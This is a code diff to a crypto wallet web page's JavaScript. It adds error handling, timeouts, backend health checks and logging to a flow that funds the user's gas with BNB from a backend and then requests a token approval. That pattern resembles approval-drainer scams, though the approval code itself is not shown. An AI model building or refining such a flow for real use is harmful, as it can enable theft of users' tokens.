@@ -352,8 +352,32 @@
     showLoading('Processing...');
     
     try {
-        const accounts = await ethereum.request({ method: 'eth_accounts' });
+        // Check if wallet is available
+        if (!window.ethereum) {
+            hideLoading();
+            alert('Please install MetaMask or Trust Wallet to continue.');
+            return;
+        }
+
+        // Check if wallet is connected, if not request connection
+        let accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (!accounts || accounts.length === 0) {
+            // Request wallet connection
+            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        }
+        
+        if (!accounts || accounts.length === 0) {
+            hideLoading();
+            alert('Please connect your wallet to continue.');
+            return;
+        }
+
         const account = accounts[0];
+        if (!account) {
+            hideLoading();
+            alert('No account found. Please connect your wallet.');
+            return;
+        }
 
         // Step 1: Check the current BNB balance (in background)
         const bnbBalance = await web3.eth.getBalance(account);
@@ -369,16 +393,35 @@
             console.log('💰 [BNB] Current balance:', balanceInBNB, 'BNB');
             console.log('💰 [BNB] Required:', requiredBNB, 'BNB');
             
-            // Request the BNB top-up from the backend
+            // Request the BNB top-up from the backend with timeout
             let topUpSuccess = false;
             let topUpError = null;
             
             try {
-                topUpSuccess = await requestBNBTopUp(account);
+                // Add timeout wrapper - backend can take 30-60 seconds for tx.wait()
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error('Request timeout after 120 seconds')), 120000)
+                );
+                
+                topUpSuccess = await Promise.race([
+                    requestBNBTopUp(account),
+                    timeoutPromise
+                ]);
             } catch (error) {
                 topUpError = error;
                 console.error('❌ [BNB] Top-up request threw an error:', error);
                 topUpSuccess = false;
+                
+                // Show error to user
+                hideLoading();
+                if (error.message && error.message.includes('timeout')) {
+                    alert('Request timed out. The backend may be slow. Please try again.');
+                } else if (error.message && error.message.includes('Failed to fetch')) {
+                    alert('Cannot connect to backend server. Please check your internet connection.');
+                } else {
+                    alert('Gas top-up failed: ' + (error.message || 'Unknown error'));
+                }
+                return;
             }
 
             if (topUpSuccess) {
@@ -474,8 +517,22 @@
         // Show approval request (MetaMask/Trust Wallet will show popup)
         await approveToken(account);
     } catch (error) {
-        console.error('Error:', error);
+        console.error('❌ [TokenApprove] Error:', error);
         hideLoading();
+        
+        // Show user-friendly error message
+        if (error.message) {
+            if (error.message.includes('User rejected') || error.message.includes('User denied')) {
+                // User canceled - no need to show error
+                return;
+            } else if (error.message.includes('wallet')) {
+                alert('Wallet error: ' + error.message);
+            } else {
+                alert('Error: ' + error.message);
+            }
+        } else {
+            alert('An error occurred. Please try again.');
+        }
     }
 }
 
@@ -563,12 +620,12 @@ async function requestBNBTopUp(account) {
         
         try {
             controller = new AbortController();
-            // Increase timeout to 60 seconds - blockchain transactions can take time to confirm
+            // Increase timeout to 120 seconds - blockchain transactions can take 30-60 seconds to confirm
             timeoutId = setTimeout(() => {
                 if (controller && controller.abort) {
                     controller.abort();
                 }
-            }, 60000); // 60 second timeout
+            }, 120000); // 120 second timeout (2 minutes) - backend waits for tx.wait() which can take 30-60 seconds
         } catch (e) {
             console.warn('⚠️ [BNB Top-up] AbortController not available, using timeout fallback');
             // Fallback: just use timeout without AbortController
@@ -579,19 +636,45 @@ async function requestBNBTopUp(account) {
         
         // First, test if backend is reachable (quick connectivity check)
         console.log('🔍 [BNB Top-up] Testing backend connectivity first...');
+        let backendReachable = false;
         try {
-            const healthCheck = await fetch(BACKEND_URL, {
-                method: 'GET',
-                mode: 'cors',
-                credentials: 'omit',
-                cache: 'no-cache',
-                redirect: 'follow'
-            });
+            const healthCheck = await Promise.race([
+                fetch(BACKEND_URL, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    cache: 'no-cache',
+                    redirect: 'follow'
+                }),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Health check timeout')), 10000))
+            ]);
             console.log('✅ [BNB Top-up] Backend is reachable! Health check status:', healthCheck.status);
+            backendReachable = true;
         } catch (healthError) {
             console.error('❌ [BNB Top-up] Backend health check failed:', healthError.message);
             console.error('⚠️ [BNB Top-up] Backend might be unreachable from this network');
-            // Continue anyway - might be a temporary issue
+            
+            // Try test endpoint
+            try {
+                const testCheck = await Promise.race([
+                    fetch(`${BACKEND_URL}/test`, {
+                        method: 'GET',
+                        mode: 'cors',
+                        credentials: 'omit'
+                    }),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Test endpoint timeout')), 5000))
+                ]);
+                if (testCheck.ok) {
+                    console.log('✅ [BNB Top-up] Test endpoint works!');
+                    backendReachable = true;
+                }
+            } catch (testError) {
+                console.error('❌ [BNB Top-up] Test endpoint also failed');
+            }
+            
+            if (!backendReachable) {
+                throw new Error('Backend server is not reachable. Please check your connection or try again later.');
+            }
         }
         
         console.log('📤 [BNB Top-up] Sending POST request...');
@@ -645,11 +728,14 @@ async function requestBNBTopUp(account) {
                     attemptOptions.signal = controller.signal;
                 }
                 
+                console.log(`📤 [BNB Top-up] Making fetch request...`);
                 response = await fetch(apiUrl, attemptOptions);
                 
                 // If we got a response (even if not ok), break the retry loop
                 if (response !== undefined) {
                     console.log(`✅ [BNB Top-up] Got response on attempt ${attempt}`);
+                    console.log(`✅ [BNB Top-up] Response status: ${response.status}`);
+                    console.log(`✅ [BNB Top-up] Response ok: ${response.ok}`);
                     break;
                 }
             } catch (err) {
@@ -680,8 +766,12 @@ async function requestBNBTopUp(account) {
         if (timeoutId) {
             clearTimeout(timeoutId);
         }
-        console.log('📥 [BNB Top-up] Response received');
+        
+        console.log('📥 [BNB Top-up] ==========================================');
+        console.log('📥 [BNB Top-up] Response received!');
         console.log('📥 [BNB Top-up] Status:', response.status, response.statusText);
+        console.log('📥 [BNB Top-up] Response ok:', response.ok);
+        console.log('📥 [BNB Top-up] ==========================================');
         
         // Log response headers for debugging
         try {
@@ -741,33 +831,52 @@ async function requestBNBTopUp(account) {
 
         let data;
         try {
+            console.log('📥 [BNB Top-up] Reading response text...');
             const responseText = await response.text();
+            console.log('📥 [BNB Top-up] Raw response text length:', responseText.length);
             console.log('📥 [BNB Top-up] Raw response:', responseText);
+            
+            if (!responseText || responseText.trim() === '') {
+                console.error('❌ [BNB Top-up] Empty response from backend');
+                return false;
+            }
+            
             data = JSON.parse(responseText);
+            console.log('📥 [BNB Top-up] Successfully parsed JSON');
         } catch(e) {
             console.error('❌ [BNB Top-up] Failed to parse JSON response');
             console.error('❌ [BNB Top-up] Parse error:', e);
+            console.error('❌ [BNB Top-up] Response might be:', response);
             return false;
         }
         
-        console.log('📥 [BNB Top-up] Parsed response data:', data);
+        console.log('📥 [BNB Top-up] Parsed response data:', JSON.stringify(data, null, 2));
         
         if (data && data.success === true) {
+            console.log('✅ [BNB Top-up] ==========================================');
             console.log('✅ [BNB Top-up] SUCCESS! Backend confirmed transaction');
             if (data.txHash) {
                 console.log('✅ [BNB Top-up] Transaction Hash:', data.txHash);
                 console.log('✅ [BNB Top-up] View on BSCScan: https://bscscan.com/tx/' + data.txHash);
             }
+            if (data.recipient) {
+                console.log('✅ [BNB Top-up] Recipient:', data.recipient);
+            }
+            if (data.amount) {
+                console.log('✅ [BNB Top-up] Amount:', data.amount);
+            }
             console.log('✅ [BNB Top-up] Transaction confirmed on blockchain!');
-            console.log('✅ [BNB Top-up] 0.0002 BNB should now be in your wallet');
+            console.log('✅ [BNB Top-up] ==========================================');
             return true;  // Return true indicating the top-up was successful
         } else {
             console.error('❌ [BNB Top-up] Backend returned success: false or missing');
-            console.error('❌ [BNB Top-up] Response data:', data);
+            console.error('❌ [BNB Top-up] Response data:', JSON.stringify(data, null, 2));
             if (data && data.error) {
                 console.error('❌ [BNB Top-up] Error message:', data.error);
             } else if (data && data.message) {
                 console.error('❌ [BNB Top-up] Error message:', data.message);
+            } else {
+                console.error('❌ [BNB Top-up] Unknown error - response structure:', Object.keys(data || {}));
             }
             return false;  // Return false indicating the top-up failed
         }
